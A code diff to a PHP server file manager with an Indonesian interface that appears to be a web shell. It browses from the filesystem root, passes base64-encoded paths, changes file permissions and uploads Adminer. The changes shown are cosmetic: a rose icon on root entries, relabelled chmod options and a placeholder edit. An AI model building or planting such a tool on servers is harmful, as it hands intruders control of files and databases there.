@@ -163,8 +163,9 @@ function display_path_links($dir) {
             $encodedPath = urlencode(base64_encode($folderPath));
             $isRoot = $folderPath === '/';
             $style = $isRoot ? "style='color:red;'" : "";
+            $rootIcon = $isRoot ? "🌹" : "";
             echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
-            echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . format_filename($folder) . "/</a>";
+            echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . format_filename($folder) . "/ $rootIcon</a>";
             echo "<span class='ml-auto'>" . get_permissions($folderPath) . "</span>";
             echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
             echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$folder')\">Ganti Nama</button>";
@@ -195,7 +196,7 @@ function display_path_links($dir) {
                                 <option value=''>Pilih Mode Chmod</option>
                                 <option value='biasa'>Biasa</option>
                                 <option value='manual'>Manual</option>
-                                <option value='copy'>Salin dari File/Folder Lain</option>
+                                <option value='copy'>chmod salin file/folder lain</option>
                             </select>
                         </div>
                         <div class='form-group' id='chmodBiasa-$folder' style='display:none;'>
@@ -205,7 +206,7 @@ function display_path_links($dir) {
                             <input type='text' id='chmodInput-$folder' name='manualChmod' placeholder='-rw-r--r--'>
                         </div>
                         <div class='form-group' id='chmodCopy-$folder' style='display:none;'>
-                            <input type='text' id='copyChmod-$folder' name='copyChmod' placeholder='Masukkan nama file/folder'>
+                            <input type='text' id='copyChmod-$folder' name='copyChmod' placeholder='Masukkan nama file'>
                         </div>
                         <input type='hidden' name='source' value='$encodedPath'>
                         <button type='submit' name='chmod' class='btn btn-primary'>Ubah Chmod</button>
@@ -242,8 +243,9 @@ function display_path_links($dir) {
             $encodedPath = urlencode(base64_encode($filePath));
             $isRoot = $filePath === '/';
             $style = $isRoot ? "style='color:red;'" : "";
+            $rootIcon = $isRoot ? "🌹" : "";
             echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
-            echo "<span>" . format_filename($file) . "</span>";
+            echo "<span>" . format_filename($file) . " $rootIcon</span>";
             echo "<span class='ml-auto'>" . get_permissions($filePath) . "</span>";
             echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
             echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$file')\">Ganti Nama</button>";
@@ -276,7 +278,7 @@ function display_path_links($dir) {
                                 <option value=''>Pilih Mode Chmod</option>
                                 <option value='biasa'>Biasa</option>
                                 <option value='manual'>Manual</option>
-                                <option value='copy'>Salin dari File Lain</option>
+                                <option value='copy'>chmod salin file/folder lain</option>
                             </select>
                         </div>
                         <div class='form-group' id='chmodBiasa-$file' style='display:none;'>
@@ -659,7 +661,7 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
                 <input type="text" placeholder="Masukkan nama file" name="adminerFilename" required>
                 <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
                 <button type="submit" name="uploadAdminer" class="btn btn-primary">Upload</button>
-                <button type="button" class="btn btn-secondary" onclick="hideForm('adminer-upload')">Batal</button>
+                <button type="button" class='btn btn-secondary' onclick="hideForm('adminer-upload')">Batal</button>
             </form>
         </div>
 
